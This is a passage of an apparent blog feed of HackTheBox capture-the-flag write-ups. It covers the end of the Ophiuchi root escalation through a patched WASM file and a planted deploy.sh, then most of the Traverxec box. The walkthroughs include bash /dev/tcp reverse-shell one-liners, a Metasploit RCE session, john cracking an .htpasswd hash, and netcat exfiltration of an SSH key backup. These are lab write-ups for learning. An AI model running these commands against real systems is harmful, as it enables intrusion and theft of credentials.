</span></span><span class="line"><span class="cl">wasm-functions/index.go
</span></span><span class="line"><span class="cl">wasm-functions/deploy.sh
</span></span><span class="line"><span class="cl">wasm-functions/main.wasm
</span></span><span class="line"><span class="cl">wasm-functions/backup/
</span></span><span class="line"><span class="cl">wasm-functions/backup/index.go
</span></span><span class="line"><span class="cl">wasm-functions/backup/deploy.sh
</span></span><span class="line"><span class="cl">wasm-functions/backup/main.wasm
</span></span><span class="line"><span class="cl">admin@ophiuchi:/opt$ cat /tmp/wasm-functions.tar.gz &gt; /dev/tcp/10.10.14.23/53
</span></span></code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span> &gt; wasm-functions.tar.gz
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">45380</span>
</span></span></code></pre></div><h4 id="reversing-mainwasm">Reversing main.wasm</h4>
<p>WASM can be {de,re}compiled using a tool, called <a href="https://github.com/WebAssembly/wabt/">wabt</a>. I will clone the repo and make the tool available to system-wide.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz -O /opt/
</span></span><span class="line"><span class="cl">$ tar -xvf /opt/wabt-1.0.23-ubuntu.tar.gz
</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34;/opt/wabt-1.0.23/bin&#34;</span>:<span class="nv">$PATH</span>
</span></span></code></pre></div><p>I will decompile the <code>main.wasm</code> using <code>wasm-decompile</code>, and it reveals that the <code>info</code> function has return value of 0.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «wasm-functions» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ wasm-decompile main.wasm 
</span></span><span class="line"><span class="cl"><span class="nb">export</span> memory memory<span class="o">(</span>initial: 16, max: 0<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">global g_a:int <span class="o">=</span> 1048576<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> global data_end:int <span class="o">=</span> 1048576<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> global heap_base:int <span class="o">=</span> 1048576<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">table T_a:funcref<span class="o">(</span>min: 1, max: 1<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="k">function</span> info<span class="o">()</span>:int <span class="o">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>I needed a return value of 1, so that <code>index.go</code> will execute the <code>deploy.sh</code>, therefore I will need to modify the <code>main.wasm</code> using <code>wasm2wat</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ wasm2wat ../loot/wasm-functions/main.wasm <span class="p">|</span> tee main.wat
</span></span><span class="line"><span class="cl"><span class="o">(</span>module
</span></span><span class="line"><span class="cl">  <span class="o">(</span><span class="nb">type</span> <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>func <span class="o">(</span>result i32<span class="o">)))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
</span></span><span class="line"><span class="cl">    i32.const 0<span class="o">)</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>table <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="m">1</span> <span class="m">1</span> funcref<span class="o">)</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>memory <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 16<span class="o">)</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>mut i32<span class="o">)</span> <span class="o">(</span>i32.const 1048576<span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>1<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>2<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;memory&#34;</span> <span class="o">(</span>memory 0<span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;info&#34;</span> <span class="o">(</span>func <span class="nv">$info</span><span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__data_end&#34;</span> <span class="o">(</span>global 1<span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__heap_base&#34;</span> <span class="o">(</span>global 2<span class="o">)))</span>
</span></span></code></pre></div><p>Then in <code>main.wat</code>, I will modify the return value of the info function to 1.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
</span></span><span class="line"><span class="cl">    i32.const 1<span class="o">)</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>I will compile the <code>main.wat</code> back to <code>main.wasm</code> using <code>wat2wasm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ wat2wasm main.wat 
</span></span></code></pre></div><p>Then I will create my own <code>deploy.sh</code> that contains a reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ cat deploy.sh 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/sh</span>
</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.23/53 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>I will transfer my <code>main.wasm</code> and <code>deploy.sh</code> using <code>scp</code> to<code>/tmp/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ scp main.wasm deploy.sh  admin@10.10.10.227:/tmp
</span></span><span class="line"><span class="cl">admin@10.10.10.227<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">main.wasm                                                                                   100%  <span class="m">112</span>     1.7KB/s   00:00    
</span></span><span class="line"><span class="cl">deploy.sh                                                                                   100%   <span class="m">60</span>     1.1KB/s   00:00 
</span></span></code></pre></div><p>Finally, I will setup a netcat listener and run the allowed sudo command on the <code>/tmp/</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
</span></span></code></pre></div><p>Now I have a root shell on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">45382</span>
</span></span><span class="line"><span class="cl">root@ophiuchi:/tmp# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@ophiuchi:/tmp# 
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210729230638797.png" alt="image-20210729230638797"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Traverxec</title>
      <link>https://fahmifj.github.io/hackthebox/traverxec/</link>
      <pubDate>Fri, 06 Aug 2021 16:12:18 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/traverxec/</guid>
      <description>Code execution with path traversal</description>
      <content:encoded><![CDATA[<p>Traverxec is an easy Linux machine that starts with exploitation of a Nostromo web server. The server is vulnerable to a remote code execution, and this allows me to gain an interactive shell access into the system. Enumeration of the system discovers a backup files that contains user SSH keys. The user is allowed to run a sudo on <code>journalctl</code> binary, and this could be leveraged to obtain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Path Traversal</li>
<li>Sudo exploitation on <code>journalctl</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Metasploit</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial TCP scan discovers two open ports: SSH on port 22 and a Nostromo web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nmap -p22,80 -sC -sV  -oA nmap/10-tcp-allport-script-traverxec 10.10.10.165
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-13 16:11 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.165
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.44s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    nostromo 1.9.6
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nostromo 1.9.6
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: TRAVERXEC
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.71 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---nostromo">TCP 80 - Nostromo</h3>
<p>The hosted site is a personal website of David White.</p>
<p><div class="img-container"><img src="imgs/image-20210714031626971.png" alt="image-20210714031626971"  /></div>
</p>
<p>At the bottom of the page, there is a contact form with 4 input vectors.</p>
<p><div class="img-container"><img src="imgs/image-20210714031846286.png" alt="image-20210714031846286"  /></div>
</p>
<p>I submitted some values  and then started to observe the network traffic, but nothing happen there.</p>
<p><div class="img-container"><img src="imgs/image-20210714032010619.png" alt="image-20210714032010619"  /></div>
</p>
<p>I  ran gobuster, but it also didn&rsquo;t find any interesting.</p>
<h4 id="finding-vulnerabilities">Finding Vulnerabilities</h4>
<p>From previous <code>nmap</code>, nmap identified the <code>nostromo</code> version to be 1.9.6. Feeding that version on <code>searchsploit</code> pops a remote code execution exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ searchsploit nostromo 1.9.6         
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                                               <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">nostromo 1.9.6 - Remote Code Execution                                                       <span class="p">|</span> multiple/remote/47837.py
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">Shellcodes: No Results
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="nostromo-rce-cve-2019-16278-metasploit">Nostromo RCE CVE-2019-16278 (Metasploit)</h4>
<p>Metasploit also has a module for the Nostromo 1.9.6 RCE and I will use that.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ msfconsole -q
</span></span><span class="line"><span class="cl">msf6 &gt; search nostromo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
</span></span><span class="line"><span class="cl"><span class="o">================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">#  Name                                   Disclosure Date  Rank  Check  Description</span>
</span></span><span class="line"><span class="cl">   -  ----                                   ---------------  ----  -----  -----------
</span></span><span class="line"><span class="cl">   <span class="m">0</span>  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/multi/http/nostromo_code_exec
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf6 &gt; use <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using configured payload cmd/unix/reverse_perl
</span></span></code></pre></div><p>Once all the configs are set, I will run the exploits. This results in an interactive shell access as <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.34:53 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Configuring Automatic <span class="o">(</span>Unix In-Memory<span class="o">)</span> target
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending cmd/unix/reverse_perl <span class="nb">command</span> payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.34:53 -&gt; 10.10.10.165:52716<span class="o">)</span> at 2021-07-13 16:31:29 -0400
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span><span class="line"><span class="cl">hostname <span class="o">&amp;&amp;</span> ip a
</span></span><span class="line"><span class="cl">traverxec
</span></span><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class="line"><span class="cl">    inet 127.0.0.1/8 scope host lo
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UNKNOWN group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/ether 00:50:56:b9:a0:f8 brd ff:ff:ff:ff:ff:ff
</span></span><span class="line"><span class="cl">    inet 10.10.10.165/24 brd 10.10.10.255 scope global eth0
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span></code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I will create another interactive shell session so I can upgrade my shell with the PTY trick.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">which bash
</span></span><span class="line"><span class="cl">/usr/bin/bash
</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.34/53 0&gt;&amp;1&#34;</span> <span class="p">&amp;</span>
</span></span></code></pre></div><p>On my new session:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165<span class="o">]</span> <span class="m">52718</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>421<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ script /dev/null -c bash 
</span></span><span class="line"><span class="cl">script /dev/null -c bash
</span></span><span class="line"><span class="cl">Script started, file is /dev/null
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">3835</span> suspended  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>     
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">3835</span> continued  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ stty cols <span class="m">127</span> rows <span class="m">30</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-david">Shell as david</h3>
<h4 id="nostromo-config">Nostromo config</h4>
<p>The <code>nostromo</code> config file under <code>/var/nostromo/conf</code> reveals that there is a <code>.htpasswd</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
</span></span><span class="line"><span class="cl"><span class="c1"># MAIN [MANDATORY]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">servername              traverxec.htb
</span></span><span class="line"><span class="cl">serverlisten            *
</span></span><span class="line"><span class="cl">serveradmin             david@traverxec.htb
</span></span><span class="line"><span class="cl">serverroot              /var/nostromo
</span></span><span class="line"><span class="cl">servermimes             conf/mimes
</span></span><span class="line"><span class="cl">docroot                 /var/nostromo/htdocs
</span></span><span class="line"><span class="cl">docindex                index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># LOGS [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">logpid                  logs/nhttpd.pid
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># SETUID [RECOMMENDED]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">user                    www-data
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># BASIC AUTHENTICATION [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">htaccess                .htaccess
</span></span><span class="line"><span class="cl">htpasswd                /var/nostromo/conf/.htpasswd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ALIASES [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/icons                  /var/nostromo/icons
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># HOMEDIRS [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">homedirs                /home
</span></span><span class="line"><span class="cl">homedirs_public         public_www
</span></span></code></pre></div><p>This<code>.htpasswd </code> file contains a password hash for user david.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
</span></span><span class="line"><span class="cl">david:<span class="nv">$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span>/
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat /etc/passwd <span class="p">|</span> grep sh <span class="o">&amp;&amp;</span> ls -l /home
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">david:x:1000:1000:david,,,:/home/david:/bin/bash
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwx--x--x <span class="m">6</span> david david <span class="m">4096</span> Jul <span class="m">13</span> 06:57 david
</span></span></code></pre></div><h4 id="password-cracking">Password Cracking</h4>
<p><code>JtR</code> can recover the password easily.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./john.exe hashes/traverxec-david.hash --wordlist<span class="o">=</span>C:/tools/rockyou.txt                                  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1</span>$ <span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3<span class="o">])</span>
</span></span><span class="line"><span class="cl">Will run <span class="m">8</span> OpenMP threads
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">Nowonly4me       <span class="o">(</span>david<span class="o">)</span>
</span></span><span class="line"><span class="cl">1g 0:00:00:43 DONE <span class="o">(</span>2021-07-14 03:44<span class="o">)</span> 0.02307g/s 244113p/s 244113c/s 244113C/s NuiKo910..Noury
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>But turns out it&rsquo;s not a reused password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ su david
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">su: Authentication failure
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ 
</span></span></code></pre></div><h4 id="path-traversal---david-home-directory">Path Traversal - David home directory</h4>
<p>The david home directory is not readable by others, but it allows execute permissions. With that, I can determine what files all are available under david&rsquo;s home directory by spamming one character and leverage the tab completion. This is one of the benefits of doing a shell upgrade!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/
</span></span><span class="line"><span class="cl">ls: cannot open directory <span class="s1">&#39;/home/david/&#39;</span>: Permission denied
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/
</span></span><span class="line"><span class="cl">drwx--x--x <span class="m">6</span> david david <span class="m">4096</span> Jul <span class="m">13</span> 06:57 /home/david/
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/.ssh
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/.ssh
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/user.txt
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root david <span class="m">33</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/user.txt
</span></span></code></pre></div><p>Then, when I type <code>public_www</code> (from nostromo config), the tab completion confirms that the folder is there. With <code>r-x</code>, I can use <code>ls -lR</code> command to list all the available contents recursively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/public_www
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/public_www
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -lR /home/david/public_www
</span></span><span class="line"><span class="cl">/home/david/public_www:
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david  <span class="m">402</span> Oct <span class="m">25</span>  <span class="m">2019</span> index.html
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> protected-file-area
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/home/david/public_www/protected-file-area:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david <span class="m">1915</span> Oct <span class="m">25</span>  <span class="m">2019</span> backup-ssh-identity-files.tgz
</span></span></code></pre></div><p>The <code>backup-ssh-identity-files.tgz</code> seems interesting, I will grab that to my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz <span class="p">|</span> nc 10.10.14.34 <span class="m">53</span>
</span></span></code></pre></div><p>On my Kali:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span> &gt; loot/backup-ssh-identity-files.tgz
